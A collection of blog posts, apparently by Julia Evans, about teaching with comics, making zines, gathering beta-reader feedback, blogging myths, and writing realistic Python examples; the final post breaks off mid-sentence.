{"url": "https://jvns.ca/blog/2018/10/28/when-does-teaching-with-comics-work-well/", "title": "When does teaching with comics work well?", "content": "\n     \n\n I’m speaking at  Let’s sketch tech!  in San Francisco\nin December. I’ve been thinking about what to talk about (the mechanics of making zines? how comics\nskills are different from drawing skills? the business of self-publishing?). So here’s one\ninteresting question: in what situations does using comics to teach help? \n\n comics are kind of magic \n\n The place I’m starting with is – comics often feel  magical  to me. I’ll post a comic on, for\ninstance, /proc, and dozens of people will tell me “wow, I didn’t know this existed, this is so\nuseful!“. It seems clear that explaining things with comics often works well for a lot of people.\nBut it’s less clear which situations comics are useful in! So this post is an attempt to explore\nthat. \n\n See also  How to teach technical concepts with cartoons \nwhich is more about techniques I use and less about “when it works”. \n\n what’s up with “learning styles?” \n\n One possible way to answer the question “when does using comics to teach work well?” is “well, some\npeople are visual learners, and for those people comics work well”. This is based on the idea that\ndifferent people have different “learning styles” and learn more effectively when taught using their\npreferred learning style. \n\n It’s clear that different people have different learning  preferences  (for instance I like\nreading text and dislike watching videos). From my very brief reading of Wikipedia, it seems less\nclear that folks actually learn more effectively when taught using their preferences. So, whether or\nnot this is true, it’s not how I think about what I’m doing here. \n\n Here’s all the reading I did about this (not much!): \n\n \n the  wikipedia article \n how to talk about learning styles  from a learning science blog \n a blog post about alternative theories that might have better evidence \n a new york times article  on study skills / learning styles \n the abstract of this review of  learning styles research  which doesn’t find evidence that students learn better with their preferred learning style \n a nice comic about learning styles  (possibly sourced from wikipedia?) \n \n\n learning preferences still matter \n\n You could conclude from this that learning preferences don’t matter at all, and you should just\nteach any given concept in the best way for that  concept . But!! I think learning preferences still\nmatter, at least for me. I don’t teach in a classroom, I teach whoever feels like reading what I’m\nwriting on the internet! And if people don’t feel like learning the things I’m teaching because of\nthe way they’re presented, they won’t! \n\n For example – I don’t watch videos to learn. (which is not to say that I’m incapable of learning\nfrom videos, just studies show I just don’t watch them). So if someone is teaching a lot of cool\nthings I want to learn on YouTube, I won’t watch them! \n\n So right now I’m reading statements like “I’m a visual learner” as a preference worth paying\nattention to :). \n\n when comics help: diagrams \n\n A lot of the systems I work with involve a lot of interacting systems. For example, Kubernetes is a\ncomplicated system with many components. It took me  months  to understand how the components fit\ntogether. Eventually I understood that the answer is this diagram: \n\n \n \n \n\n The point of this diagram  is that all Kubernetes’ state lives in etcd, every other Kubernetes\ncomponent decides what to do by making requests to the API server, and none of the components\ncommunicate with each other (or etcd) directly. Those are some of the most important things to know\nabout Kubernetes’ architecture, which is why they’re in the diagram. \n\n Not all diagrams are helpful though!! I’m going to pick on someone else’s kubernetes diagram ( source ), which is totally accurate but which I personally find less helpful. \n\n \n \n \n\n I think the way this diagram (and a lot of diagrams!) are drawn is: \n\n \n identify the components of the system \n draw boxes for each component and arrows between components that communicate \n \n\n This approach works well in a lot of contexts, but personally I find it often leaves me feeling\nconfused about how the system works. Diagrams like this often don’t highlight the most\nimportant/unusual architectural decisions! The way I like to draw diagrams is, instead: \n\n \n figure out what the key architecture decision(s) are that folks need to understand to use it \n draw a diagram that illustrates those architecture decisions (possibly including boxes and arrows) \n leave out parts that aren’t key to understanding the architecture \n \n\n So, for that kubernetes diagram, I left out pods and the role of the kubelet and where any of these\ncomponents are running (on a master? on a worker?), because even those are very important,\nthey weren’t my teaching goals for the diagram. \n\n when comics help: explaining scenarios \n\n Something I find really effective is to quickly explain a few important things about something\nthat’s really complicated like “how to run kubernetes” or “how distributed systems work”. \n\n Often when trying to explain a huge topic, people start with generalities (“let me explain what a\nlinearizable system is!“). I have another approach that I prefer, which I think of as the\n“scenes from” approach, or “get specific!”. (which is the same as the best way to give a lightning\ntalk – explain one specific interesting thing instead of trying to give an overview). \n\n The idea is to zoom into a common specific scenario that you’ll run into in real life. For example,\na really common situation when using a linearizable distributed system is that it’ll periodically\nbecome unavailable due to a leader election. I didn’t know that that was commmon when I started\nworking with distributed systems!! So just saying “hey, here is a thing that happens in practice”\ncan be useful. \n\n Here are 2 example comics I’ve done in this style: \n\n \n \n \n \n \n \n \n \n\n Comics are a really good fit for illustrating scenarios like this because often there’s some kind of\ninteraction! (“can’t you see we’re having a leader election??”) \n\n when comics help: writing a short structured list \n\n I’ve gotten really into using comics to explain command line tools recently (eg the  bite size\ncommand line zine ). \n\n One of my favorite comics from that zine is the grep comic. The reason I love this comic is that it\nliterally includes every grep command line argument I’ve ever used, as well as a few I haven’t but\nthat I think seem useful. And I’ve been using grep for 15 years! I think it’s amazing that it’s\npossible to usefully summarize grep in such a small space. \n\n \n \n \n \n \n\n I think it’s important in this case that the list be  structured  – all of the things in this\nlist are the same type (“grep command line arguments”). I think comics work well here just because\nyour can make the list colourful / fun / visually appealing. \n\n when comics help: explaining a simple idea \n\n I spent most of  bite size linux  explaining various Linux ideas.\nHere’s a pipes comic that I was pretty happy with! I think this is a little bit like “draw a\ndiagram” – there are a few fundamental concepts about pipes that I think are useful to\nunderstand, specifically that pipes have a buffer and that writes to a pipe block if the buffer is\nfull. \n\n \n \n \n \n \n\n I think comics work well for this just because you can mix text and small diagrams really easily,\nand with something like pipes the tiny diagrams help a lot. \n\n that’s all for now \n\n I don’t think this is the ‘right’ categorization of “when comics work for teaching” yet. But I think\nthis is a somewhat accurate description of how I’ve been using them so far. If you have other\nthoughts about when comics work (and when they don’t!) I’d love to hear them. \n\n"},
{"url": "https://jvns.ca/blog/2019/09/01/ways-to-write-zines-without-fancy-tools/", "title": "How to write zines with simple tools", "content": "\n     \n\n People often ask me what tools I use to write my zines ( the answer is\nhere ). Answering this question as written has\nalways felt slightly off to me, though, and I couldn’t figure out why for a long time. \n\n I finally realized last week that instead of “what tools do you use to write zines?” some people may\nhave actually wanted to know “how can I do this myself?”! And “buy a $500 iPad” is not a terribly\nuseful answer to that question – it’s not how I got started, iPads are kind of a weird fancy way to\nwrite zines, and most people don’t have them. \n\n So this blog post is about more traditional (and easier to get started with) ways to write zines. \n\n We’re going to start out by talking about the mechanics of how to write the zine, and then talk\nabout how to assemble it into a booklet. \n\n Way 1: Write it on paper \n\n This is how I made my first zine (spying on your programs with strace) which you can see here:  https://jvns.ca/strace-zine-unfolded.pdf . \n\n Here’s an example of a page I drew on paper this morning pretty quickly. It looks kind of bad\nbecause I scanned it with my phone, but if you use a real scanner (like I did with the strace PDF\nabove), the scanned version comes out better. \n\n \n\n Way 2: Use a Google doc \n\n The next option is to use a Google doc (or whatever other word processor you prefer).  Here’s the Google doc I wrote for the below image , and here’s what it looks like: \n\n \n\n They key thing about this Google doc approach is to apply some “less is more”. It’s intended to be\nprinted as part of a booklet on  half  a sheet of letter paper, which means everything needs to be\ntwice as big for it to look good. \n\n Way 3: Use an iPad \n\n This is what I do (use the Notability app on iPad). I’m not going to talk about this method much\nbecause this post is about using more readily available tools. \n\n \n\n Way 4: Use a single sheet of paper \n\n This is a subset of “Write it on paper” – the  Wikibooks page on zine making  has a great guide that shows how to write out a tiny zine on 1 piece of paper and then fold it up to make a little booklet. Here are the pictures of the steps from the Wikibooks page: \n\n \n \n \n \n \n \n \n \n\n Sumana Harihareswara’s  Playing with\npython \nzine is a nice example of a zine that’s intended to be folded up in that way. \n\n Way 5: Adobe Illustrator \n\n I’ve never used Adobe Illustrator so I’m not going to pretend that I know anything about it or put\ntogether an example using it, but I hear it’s a way people do book layout. \n\n booklets: the photocopier method \n\n So you’ve written a bunch of pages and want to assemble them into a booklet. One way to do this (and\nwhat I did for my first zine about strace!) is the photocopier method. There’s a great guide by Julia Gfrörer in\n this tweet , which I’m going to reproduce\nhere: \n\n \n \n \n \n\n That explanation is excellent and I don’t have anything to add. I did it that way and it worked\ngreat. \n\n If you want to buy a print copy of that how-to-make-zines zine from Thruban Press, you can  get it\nhere on Etsy . \n\n booklets: the computer method \n\n If you’ve made your zine in Google Docs or in another computery way, you probably want a more\ncomputery way of assembling the pages into a booklet. \n\n what I use: pdflatex \n\n I do this using the  pdfpages  LaTeX extension. This sounds complicated but it’s not really, you don’t\nneed to learn latex or anything. You just need to have pdflatex on your system, which is a  sudo apt\ninstall texlive-base  away on Ubuntu. The steps are: \n\n \n Get a PDF with the pages from your zine (pages need to be a multiple of 4) \n Get the latex file from  this gist \n Replace  /home/bork/http-zine.pdf  with the path to your PDF  and  1-28  with  1-however many\npages are in your zine . \n run  pdflatex formatted-zine.tex \n Tweak the parameters until it looks the way you want. The  documentation for the pdfpages package is here \n \n\n I like using this relatively complicated method because there are always small tweaks I want to make\nlike “oh, the right margin is too big, crop it a little bit” and the pdfpages package has tons of\noptions that let me make those tweaks. \n\n other methods \n\n \n On Linux you can use the  pdfjam  bash script, which is just a wrapper around the pdfpages latex\npackage. This is what I used to do but today I find it simpler to use the pdfpages latex package\ndirectly. \n There’s a program called  Booklet Creator  for Mac and Windows\nthat  @mrfb uses . It looks pretty simple to\nuse. \n If you convert your PDF to a ps file (with  pdf2ps  for instance),  psnup  can do this. I tried\n cat file.ps | psbook | psnup -2 > booklet.ps  and it worked, though the resulting\nPDFs are a little slow to load in my PDF viewer for some reason. \n there are probably a ton more ways to do this, if you know more let me know \n \n\n making zines is easy and low tech \n\n That’s all! I mostly wanted to explain that zines are an easy low tech thing to do and if you think\nmaking them sounds fun, you definitely 100% do not need to use any fancy expensive tools to do it,\nyou can literally use some sheets of paper, a Sharpie, a pen, and spend $3 at your local print shop\nto use the photocopier. \n\n resources \n\n summary of the resources I linked to: \n\n \n Guide to putting together zines with a photocopier by Julia Gfrörer:  this tweet ,  get it on Etsy \n Wikibooks page on zine making \n Notes on making zines using Google Docs:  this twitter thread \n Stolen Sharpie Revolution  (the first book I read about\nmaking zines). You can also get it on Amazon if you want but it’s probably better to buy directly\nfrom their site. \n Booklet Creator \n \n\n"},
{"url": "https://jvns.ca/blog/2020/11/07/a-new-way-i-m-getting-feedback-on-my-zines--beta-readers-/", "title": "A new way I'm getting feedback on my zines: beta readers!", "content": "\n     \n\n In the last few weeks I’ve been editing 2  zines  and getting them ready to\nrelease: one on CSS and one on bash. \n\n I have a lot of ways I get feedback on my zines to make them better, including: \n\n \n post individual pages on Twitter and see what people say \n hire someone to go over the zine in depth and see what they find confusing (I do this with my friend Dolly, who always points out a million things that don’t make sense and helps me come up with ideas for new pages on topics that I’ve totally forgotten to explain) \n hire a technical reviewer \n ask a friend to casually look at parts of it and see what they think (the diagrams in the SQL zine are thanks to my friend Anton who told me “these diagrams are confusing, what if you did them like this instead?”) \n ask my partner to read it \n hire a copy editor near the end \n \n\n But I still felt like I wasn’t getting quite enough feedback about which parts\nof the zine were confusing and needed to be made more clear. \n\n So this round of zine editing, I had an idea: what if I recruited 10-20 beta\nreaders and got their thoughts? I thought this worked really well, so here’s my\nprocess for doing this in case it’s useful for someone else writing a book. \n\n (and since a few people have offered: I’ll say to start out that I’m not\nlooking for new beta readers right now, but I really appreciate everyone who\nhas helped with this!) \n\n step 1: email my mailing list and ask for beta readers \n\n I sent a quick note out to part of my mailing list, like this: \n\n \n If you’d be interested in reading through a draft of the zine and sending me\nsome feedback about which parts are confusing, email me at\nREDACTED! I’m especially interested in hearing from people who\nknow some basic CSS, but still get really confused & frustrated every time they\ntry to get something done. \n\n Anyone who gives me beta reader feedback on the zine will get a free copy of\nthe zine when it comes out, as a thank you :) \n \n\n Julia \n\n I think there were 3 important things here: \n\n \n the number of people I sent it to : I sent this to about 300-600 people, and\nabout 5% of the people I emailed replied – 10-30 beta readers. I think that\ngave me a good range of feedback and that I’d aim for a similar number in\nthe future. I think that if I emailed way more people (like 2000), it would\nbe hard to manage emailing all of them and digesting all the feedback \n saying who specifically I want feedback from . In this case, I said that\nI wanted to hear from “people who know some basic CSS, but still get really\nconfused & frustrated every time they try to get something done.” I think\nthis is important because it lets me focus on feedback from people who are\nin the audience for the zine. \n ask people to briefly summarize their experience with the topic . This is\nsomething I  didn’t  ask for, but that most people naturally did on their\nown when emailing me – they’d write a sentence or two about their\nexperience with CSS. I think that next time I’d ask people to do this\nbecause I found it VERY helpful to understand a little bit about the\nperson’s experience when reading their feedback. \n \n\n step 2: explain what kind of feedback I want \n\n I think this was the most important step. I wanted a really specific  kind  of\nfeedback from my beta readers (to tell me which parts of the zine were\nconfusing), and I knew that I wouldn’t get it if I didn’t ask for it\nspecifically. So I wrote a pretty detailed email explaining the kinds of\nfeedback I wanted and the kinds of feedback I  didn’t  want. \n\n I also tried to be respectful of people’s time – I knew that people were busy,\nso I said that I appreciated any amount of feedback, even if they didn’t\nhave time to read the whole zine. \n\n \n Hi NAME! (sometimes a quick sentence personal to them here, like “You’re definitely who I want to hear from – I partly wrote this for people who wrote CSS 10 years ago and haven’t learned anything new since then”) \n\n Here’s a link to download the current zine draft:  https://www.dropbox.com/REDACTED  (please don’t share it!) \n\n Any amount of feedback really helps me – if you just read 5 pages of the zine and only have 2-3 small pieces of feedback, please send it! I’d like to get the feedback by Saturday. You can either leave comments on Dropbox or just download the PDF and send me an email with a bunch of notes like “page 6: I didn’t understand XYZ”. Whatever’s easier for you! \n\n here’s the kind of feedback that would help me the most: \n\n \n Things you found confusing. Things like:\n\n \n On page 3 it uses the term “inline” and I had to look up what that meant \n Nothing on page 10 made sense to me, I was just really confused \n \n Questions you have (either big questions like “what even is the point of this feature at all?” or small questions like “what is that code supposed to output?”) \n Specific things you learned! (for example, “I never understood what X syntax meant, and now I get it!”) \n \n\n I’m generally  not  looking for: \n\n \n Things that you think  someone else  might find confusing, but that you yourself understand. I find that most people (including me, which is why I’m asking for this feedback!) aren’t great at simulating what someone else might find confusing. \n Technical review (I have someone else doing that and I find it’s simpler not to crowdsource tech review) \n \n\n (though if you have something in these categories that you think is especially important, I’m happy to hear it!) \n\n thanks again, and I’m excited to hear what you have to say! \n\n Julia \n \n\n step 3: consolidate the feedback! \n\n People REALLY delivered and gave me really great feedback! I wasn’t sure if\npeople responding would stick to the guidelines of “I found this confusing”,\n“here’s a question I have”, and “here’s something I learned”, but almost\neveryone did! \n\n For both zines I gave people a pretty short deadline, about 6 days. So about a\nweek later I went through all the feedback and organized everyone’s comments. \n\n Pretty much everyone had organized their comments by page, so I created a text file that looked like this: \n\n Page 10: specificity\nNAME 1: some feedback\nNAME 2: more feedback\nNAME 2: a different point\n \n\n Then I wrote a Python script to put all the comments for each page into the Trello card for that page (where I’ve been putting all the feedback I get from everyone) \n\n a side excursion into Dropbox’s comments API \n\n One small surprising thing that initially I didn’t expect is: I’d given\neveryone a Dropbox link to download the zine, and I’d forgotten that Dropbox\nhas a commenting feature. So people who happened to have a Dropbox account\nwould comment inside the Dropbox commenting feature. \n\n I was a bit confused about how to handle this at first, because it turns out\nthat for some reason that page renders extremely slowly on my laptop and so it\nwas almost impossible to copy the comments out. \n\n But then I remembered that I’m a programmer, so I: \n\n \n went into the network tab and reloaded the page \n found the request for the  list_comments  endpoint (or whatever it was called). \n right clicked, clicked ‘copy as cURL` \n pasted it into my terminal, and voila! I had a JSON file of all the comments! Way easier than manually copying and pasting everything. \n wrote a little Python script to format the comments into a text file in a format I could use \n \n\n step 4: look for patterns \n\n Unsurprisingly, there were a lot of patterns in the feedback – most pages had\nfeedback from maybe 5 people, and there were a few places where everyone\nwould be confused about the exact same thing. This was SO HELPFUL because it was a\nclear sign that I definitely needed to change it. \n\n Of course, sometimes people disagreed – sometimes one person would say\nsomething “this is really clear and I learned X Y Z from this page” and another\nperson would say “this is very confusing, I have all these questions”. In cases\nlike that, I usually tried to think about which person was closer to who I\nthought the audience for the zine was (which is why it’s so helpful to get a\nsense for each person’s background!), as well as always trying to fix the\nconfusing thing if I could find a way to do it. \n\n step 5: make the changes \n\n Some confusing things were easy to fix, like “there’s a footnote here and I\ncan’t figure out what it refers to”, or “you talk about ‘css reset’\nstylesheets” but the explanation makes no sense”. \n\n Some were harder, for example I have a page about stacking contexts that I\n knew  was confusing, and the beta readers confirmed it was in fact pretty\nconfusing. I think the root cause here is that stacking contexts might be\nactually literally impossible to explain in 100 words / 6 panels, so I\napproached problems like that by finding some simpler concept I  could  explain\nin a small space, like “if  z-index  isn’t working the way you expect, the\nreason is probably that you have 2 elements in different stacking contexts”. \n\n One of the biggest changes I made to the CSS zine after getting the beta reader\nfeedback was to add some examples ( https://css-examples.wizardzines.com )\nfocused on things that the beta readers had found confusing and mark the panels\nwhich have associated examples with a little “try me!” icon. \n\n it really helped me feel more confident about the zine! \n\n I always have this moment of anxiety when I release a new zine like “OH NO\nMAYBE THIS IS AWFUL AND NOBODY WILL UNDERSTAND ANYTHING”. Getting feedback from\nthe beta readers has helped with this – because people both told me what they\nlearned and what questions they had, I could see that a lot of the parts of the\nzine  weren’t  that confusing and that I was getting across a lot of the\ninformation that I’d hoped to get across. \n\n that’s all! \n\n Thanks so much to everyone who was a beta reader for these two zines (you know\nwho you are!).  I should say that I’m not looking for new beta readers now, but\nif you’re on my  saturday comics \nmailing list, you might get an email from me at some point asking if you’re\ninterested in being a beta reader :) \n\n"},
{"url": "https://jvns.ca/blog/2020/08/12/some-possible-future-zines/", "title": "Some possible future zines", "content": "\n     \n\n Hello! I’ve been thinking about what zines I want to write in the future a bit.\nUsually I don’t have any plans for what I’m going to write next, but having no\nplan at all feels like it might be getting a bit old. \n\n So this post is mostly a way for me to try to organize my thoughts about why I\nchoose certain topics and what I might want to write in the future. \n\n the criteria \n\n I’m interested in writing about things that are \n\n \n fundamental in some way \n very useful to know in your programming job \n stable (the basics of SQL / git / CSS / HTTP / Linux aren’t going to change any time in the next 5-10 years!) \n possible to learn the basics of quickly \n \n\n There are a LOT of topics that fit these criteria. As I was thinking about\ntopics, I realized that there are lots of topics (like object oriented\nprogramming principles) that I think could in theory be pretty valuable but\nthat just didn’t speak to me. What’s up with that? \n\n I only write about topics that I care about \n\n I think a thing that I was missing was – I only write about topics that\nI really think are exciting and fun and important and want to share with people. Some topics\nI have kind of a weird and complicated love for, like\n containers  (why are they so weird?!). \n\n And right now I’m writing about CSS, which I’m only learning how to love pretty\nrecently. \n\n I think it’s often important for me to write about topics which I now love\nbut in the past did not love. For example, it took me a very long time to\nunderstand how to use  tcpdump , and\nonce I got it I felt like I had to tell everyone HELLO I FIGURED IT OUT TCPDUMP\nIS ACTUALLY AWESOME AND NOT THAT HARD. \n\n It feels a lot less interesting to write about topics where it was immediately\nobvious to me why they were great or which were easy for me to learn. \n\n zines that I might write \n\n \n shell scripting \n debugging (I have 70% of a debugging zine!) \n testing \n more linux internals \n C basics \n gdb \n binary, character encodings, binary formats \n how git works \n TLS certificates, CSRs, CAs, etc. \n profiling \n data structures: graph theory / binary trees / hashmaps \n the Python standard library and/or fun Python basics \n pandas and/or numpy (though I think maybe the  pandas cookbook  is a better medium for that than a zine) \n machine learning (maybe just logistic regression?) \n \n\n and a few that I think might be too small or too big for a zine: \n\n \n Rust (too big!) \n DNS (maybe a mini zine one day? I really love DNS & dig!) \n \n\n zines that I don’t think I can write \n\n Here are some topics for zines that I think are “fundamental” in the same way\nand that I think could be really cool. I don’t think that I could write these\ntoday, either because I don’t know enough about the topic yet or because I\ndon’t really feel enough love for it yet. \n\n As with most things, the only way I’ll probably learn more about these is if I\nend up using them more. \n\n \n web accessibility \n postgres (transactions etc?) \n x86 assembly \n hashing (bcrypt, sha-1, md5, etc) \n encryption \n JVM internals \n code review \n kubernetes \n websockets (is there enough to write a whole zine about websockets? I don’t know!) \n functional programming / object oriented programming \n ‘big data’ topics (hadoop, data warehouses, etc) \n paxos or raft \n how search works (like elasticsearch) \n how databases work \n \n\n that’s all! \n\n I’m still not sure (even after doing this for years!) why it’s so hard for me\nto tell what topics will make for a good zine that I can write. Maybe one day I\nwill figure it out! \n\n"},
{"url": "https://jvns.ca/blog/2023/06/05/some-blogging-myths/", "title": "Some blogging myths", "content": "\n     \n\n A few years ago I gave a short talk ( slides )\nabout myths that discourage people from blogging. I was chatting with a friend\nabout blogging the other day and it made me want to write up that talk as a\nblog post. \n\n here are the myths: \n\n \n myth: you need to be original \n myth: you need to be an expert \n myth: posts need to be 100% correct \n myth: writing boring posts is bad \n myth: you need to explain every concept \n myth: page views matter \n myth: more material is always better \n myth: everyone should blog \n \n\n myth: you need to be original \n\n This is probably the one I hear the most often – “Someone has written about\nthis before! Who’s going to care about what I have to say?“. \n\n The main way I think about this personally is: \n\n \n identify something I personally have found confusing or interesting \n write about it \n \n\n The idea is that if I found it confusing, lots of other people probably did\ntoo, even though the information might theoretically be out there on the\ninternet somewhere. Just because there is information on the internet, it\ndoesn’t get magically teleported into people’s brains! \n\n I sometimes store up things that I find confusing for many months or years –\nfor example right now I’m confused about some specific details of how Docker\nnetworking works on Mac, but I haven’t figured it out enough to be able to\nwrite about it. If I ever figure it out to my satisfaction I’ll probably write\na blog post. \n\n Sometimes when I write a blog post, someone will link me to a great existing\nexplanation of the thing that I hadn’t seen. I try to think of this as a good\nthing – it means that I get a new resource that I couldn’t find, and maybe\nother people find out about it too. Often I’ll update the blog post to link\nto it. \n\n A couple of other notes about this one: \n\n \n technology changes, and the details matter. Maybe the exact details about how to do something have changed in the last 5 years, and there isn’t much written about the situation in 2023! \n personal stories are really valuable. For example I love my friend Mikkel’s  Git is my buddy  post about how he uses Git. It’s not the same way that I use it, and I like seeing his approach. \n \n\n a bit more about my love for personal stories \n\n I think the reason I keep writing these blog posts encouraging people to blog\nis that I  love  reading people’s personal stories about how they do stuff with\ncomputers, and I want more of them. For example, I started using a Mac\nrecently, and I’ve been very annoyed by the lack of tracing tools like strace. \n\n So I would love to read a story about how someone is using tracing tools to debug on\ntheir Mac in 2023! I found  one from 2016 ,\nbut I think the situation with system integrity protection has changed since\nthen and the instructions don’t work for me. \n\n That’s just one example, but there are a million other things on computers that\nI do not know how to do, where I would love to read 1 person’s story of exactly\nhow they did it in 2023. \n\n myth: you need to be an expert \n\n The second myth is that you need to be an expert in the thing you’re writing\nabout. If you’ve been reading this blog, you probably know that I’ve\nwritten a lot of “hey, I just learned this!” posts over the years, where I: \n\n \n Learn an interesting thing (“hey, I didn’t know how gdb works, that’s cool!”) \n Write a short blog post about what I learned ( how does gdb work? ) \n \n\n You actually just need to know 1-2 interesting things that the reader doesn’t.\nAnd if you just learned the thing yesterday, it’s certain that lots of other\npeople don’t know it either. \n\n myth: posts need to be 100% correct \n\n I try to my make my posts  mostly  correct, and I’ve gotten a bit better at\nthat over time. \n\n My main strategy here is to just add qualifiers like “My understanding is..” or\n“I think..” before statements that I’m not totally sure of. This saves a lot of\ntime fact checking statements that I’m honestly not sure how to fact check most\nof the time. \n\n Some examples of “I think…s” from  my past blog posts: \n\n \n I think people are replacing “how many golf balls can fit in the Empire State Building” with more concrete [interview] questions about estimating program runtime and space requirements. \n\n I think the most important thing with bridges is to set up the route tables correctly. So far my understanding is that there are 2 route table entries you need to set: … \n\n Etsy uses PHP, which I think means they can’t have long-lived persistent TCP connections \n\n I think the MTU on my local network is 1500 bytes. \n \n\n I still don’t know if all of those statements are true (is it true that PHP\nprograms can’t have long-lived persistent TCP connections? maybe not!), so the\nqualifiers are useful. I don’t really know anything about PHP so I don’t have\nmuch interest in fact checking that PHP statement – I’m happy to leave it as\nan “I think” and potentially correct later it if someone tells me it’s wrong. \n\n I do tend to overdo the “I think that…” statements a bit (bad habit!) and\nsometimes I need to edit them out when actually it’s something I’m 100% sure\nof. \n\n myth: writing boring posts is bad \n\n The reality of publishing things on the internet is that interesting things get\nboosted, and boring things get ignored. So people are basically guaranteed to\nthink your posts are much more interesting that they actually are, because\nthey’re more likely to see your interesting posts. \n\n Also it’s hard to guess in advance what people will think is interesting, so I\ntry to not worry too much about predicting that in advance.  I really\nDarius Kazemi’s  How I Won The Lottery  talk on this topic about\nhow putting things on the internet is like buying lots of lottery tickets, and\nthe best way to “win” is to make a lot of stuff. \n\n myth: you need to explain every concept \n\n It’s common for people writing advanced posts (like “how malloc works”) to try\nto include very basic definitions for beginners. \n\n The problem is that you end up writing something that feels like it wasn’t\nwritten for  anyone : beginners will get confused (it’s very hard to bring\nsomeone from “I have no idea what memory allocation is” to “in depth notes\nabout the internals of malloc” in a single blog post), and more advanced\nreaders will be bored and put off by the overly basic explanations. \n\n I found that the easiest way to start was to  pick one person and write for them . \n\n You can pick a friend, a coworker, or just a past version of yourself. Writing\nfor just 1 person might feel insufficiently general (“what about all the other\npeople??“) but writing that’s easy to understand for 1 person (other than you!)\nhas a good chance of being easy to understand for many other people as well. \n\n writing has gotten harder as I get more experienced \n\n Someone who read this mentioned that they feel like writing has gotten harder as they get more experienced, and I feel the same way. \n\n I think this is because the gap between me and who I’m writing for has gotten a\nbigger over time, and so it gets a little harder for me to relate to people who\nknow less about the topic. I think on the balance having more experience makes\nmy writing better (I have more perspective!), but it feels harder. \n\n I don’t have any advice to give about this right now. I just want to\nacknowledge that it’s hard because someone who read a draft of this mentioned it. \n\n myth: page views matter \n\n I’ve looked at page view analytics a lot in my life, and I’ve never really gotten anything out of it. Comments like this one mean a lot more to me: \n\n \n Hey, @b0rk. Just wanted to let you know that  this post  really helped me to improve my skill of understanding a complex concept. Thanks! :) \n \n\n If it helps one person, I figure I’ve won. And probably it helped 10 other people who didn’t say anything too! \n\n myth: more material is always better \n\n I appreciate the work that goes into extremely deep dive blog posts, but\nhonestly they’re not really my thing. I’d rather read something short, learn a\ncouple of new things, and move on. \n\n So that’s how I approach writing as well. I’ll share a couple of interesting\nthings and then leave anything extra for another post. For me this works well\nbecause short posts take less time to write. \n\n This one is obviously a personal preference: short posts aren’t “better”\neither, I just like them more. \n\n But I often see people get tripped up by wanting to include EVERYTHING in their\nblog post and then never publishing anything and I think it’s worth considering just\nmaking the post shorter and publishing it. \n\n some notes on pedantic/annoying comments \n\n Someone who read a draft of this mentioned struggling with comments that are\npedantic or annoying or mean or argumentative. That one’s definitely not a\nmyth, I’ve read a lot of comments like that about my work. (as well as a lot\nmore comments where people are being constructive, but those ones\naren’t the problem) \n\n A few notes on how I deal with it: \n\n \n The “don’t read the comments” advice has never worked for me, for better or\nfor worse. I read all of them. \n I don’t reply to them. Even if they’re  wrong . I dislike arguing on the\ninternet and I’m extremely bad at it, so it’s not a good use of my time. \n Sometimes I can learn something new from the comment, and I try to take that\nas a win, even if the thing is kind of minor or the comment is phrased in a\nway that I find annoying. \n Sometimes I’ll update the post to fix mistakes. \n I’ve sometimes found it helpful to reinterpret people being mad as people being\nconfused or curious. I wrote a  toy DNS resolver  once and some of the commenters\nwere upset that I didn’t handle parsing the DNS packet. At the time I thought\nthis was silly (I thought DNS parsing was really straightforward and that it was obvious\nhow to do it) but I realized that maybe the commenters didn’t think it was\neasy or obvious, and wanted to know how do it. Which makes sense! It’s not\nobvious! Those comments partly inspired\n implement DNS in a weekend , which focuses much more heavily on the parsing aspects. \n \n\n As with everything I don’t think this is the “best” way to deal with\npedantic/annoying comments, it’s just what I do. \n\n myth: everyone should blog \n\n I sometimes see advice to the effect of “blogging is great! public speaking is\ngreat! everyone should do it! build your Personal Brand!“. \n\n Blogging isn’t for everyone. Tons of amazing developers don’t have blogs or\npersonal websites at all. I write because it’s fun for me and it helps me\norganize my thoughts. \n\n that’s all for now! \n\n Probably I’ll write another meta post about blogging in a couple of years since\napparently that’s what I do :) \n\n Thanks to Ed, Jeff, Brian, Hazem, Zachary, and Miccah for reading a draft of this \n\n"},
{"url": "https://jvns.ca/blog/2021/07/08/writing-great-examples/", "title": "Write good examples by starting with real code", "content": "\n     \n\n When I write about programming, I spend a lot of time trying to come up with\ngood examples. I haven’t seen a lot written about how to make examples, so\nhere’s a little bit about my approach to writing examples! \n\n The basic idea here is to start with real code that you wrote and then remove\nirrelevant details to make it into a self-contained example instead of coming\nup with examples out of thin air. \n\n I’ll talk about two kinds of examples: realistic examples and suprising\nexamples. \n\n good examples are realistic \n\n To see why examples should be realistic, let’s first talk about an unrealistic\nexample! Let’s say we’re trying to explain Python lambdas (which is just the\nfirst concept I thought of). You could give this example, of using  map  and a\nlambda to double a set of numbers. \n\n numbers = [1, 2, 3, 4]\nsquares = map(lambda x: x * x, numbers)\n \n\n I think this example is unrealistic for a couple of reasons: \n\n \n squaring a set of numbers isn’t something you’re super likely to do in a real\nprogram unless it’s for Project Euler or something (there are LOTS of\noperations on lists that are a lot more likely) \n This usage of  map  is not idiomatic Python, even if you were doing this I\nwould write  [x*x for x in numbers]  instead \n \n\n A more realistic example of Python lambdas is using them with  sort , like this; \n\n children = [{\"name\": \"ashwin\", \"age\": 12}, {\"name\": \"radhika\", \"age\": 3}]\nsorted_children = sorted(children, key=lambda x: x['age'])\n \n\n But this example is still pretty contrived (why exactly do we need to sort\nthese children by age?). So how do we actually make realistic examples? \n\n how to make your examples realistic: look at actual code you wrote \n\n I think the easiest way to make realistic examples is, instead of pulling an\nexample out of thin air (like I did with that  children  example), instead just\nstart by looking at real code! \n\n For example, if I grep a bunch of Python code I wrote for  sort.+key , I find\nLOTS of real examples of me sorting a list by some criterion, like: \n\n \n tasks.sort(key=lambda task: task['completed_time']) \n emails = reversed(sorted(emails, key=lambda x:x['receivedAt'])) \n sorted_keysizes = sorted(scores.keys(), key=scores.get) \n shows = sorted(dates[date], key=lambda x: x['time']['performanceTime']) \n \n\n It’s pretty easy to see a pattern here – a lot of these are sorting by time!\nSo now we can make a simple realistic example of sorting some objects (emails,\nevents, etc) by time, like sorting some calendar events by their unix timestamp: \n\n events = [\n    { 'date': 1625837042, 'name': 'birthday party'},\n    { 'date': 1620581136, 'name': 'dinner with Yifei'},\n    { 'date': 1589045136, 'name': 'dentist appointment'},\n]\nsorted_events = sorted(events, key=lambda x: x['date'])\n \n\n I think this is more realistic than the “sort children by age” example, and\nit’s just as simple! \n\n realistic examples help “sell” the concept you’re trying to explain \n\n When I’m trying to explain an idea (like Python lambdas), I’m usually also trying\nto convince the reader that it’s worth learning! Python lambdas are super\nuseful! And to convince someone that lambdas are 